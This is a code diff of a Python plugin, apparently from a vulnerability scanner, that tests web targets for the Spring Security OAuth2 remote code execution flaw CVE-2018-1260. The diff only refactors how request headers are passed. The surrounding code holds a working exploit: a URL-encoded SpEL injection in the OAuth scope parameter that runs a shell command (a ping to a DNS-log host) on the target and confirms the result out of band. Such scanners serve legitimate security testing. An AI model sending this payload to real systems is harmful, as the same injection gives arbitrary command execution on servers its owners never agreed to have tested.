@@ -23,7 +23,7 @@ class VulnerabilityInfo(object):
         self.info['details'] = Medusa  # 结果
 
 
-def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
+def medusa(Url:str,Headers:dict,proxies:str=None,**kwargs)->None:
     proxies=Proxies().result(proxies)
     scheme, url, port = UrlProcessing().result(Url)
     if port is None and scheme == 'https':
@@ -33,15 +33,11 @@ def medusa(Url:str,RandomAgent:str,proxies:str=None,**kwargs)->None:
     else:
         port = port
     try:
-        headers = {
-            'User-Agent': RandomAgent,
-            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
-            "Accept-Encoding": "gzip, deflate",
-        }
+
         DL=Dnslog()
         payload ="/oauth/authorize?client_id=client&response_type=code&redirect_uri=http://www.github.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22ping%20{}%22%29%7D".format(DL.dns_host())
         payload_url = scheme + "://" + url + ":" + str(port) + payload
-        resp = requests.get(payload_url,headers=headers, proxies=proxies, timeout=6, verify=False)
+        resp = requests.get(payload_url,headers=Headers, proxies=proxies, timeout=6, verify=False)
         time.sleep(4)
         if DL.result():
             Medusa = "{}存在SpringSecurityOauth2远程代码执行漏洞(CVE-2018-1260)\r\n验证数据:\r\n返回内容:{}\r\nDnsLog:{}\r\nDnsLog数据:{}\r\n".format(url,resp.text, DL.dns_host(), str( DL.dns_text()))
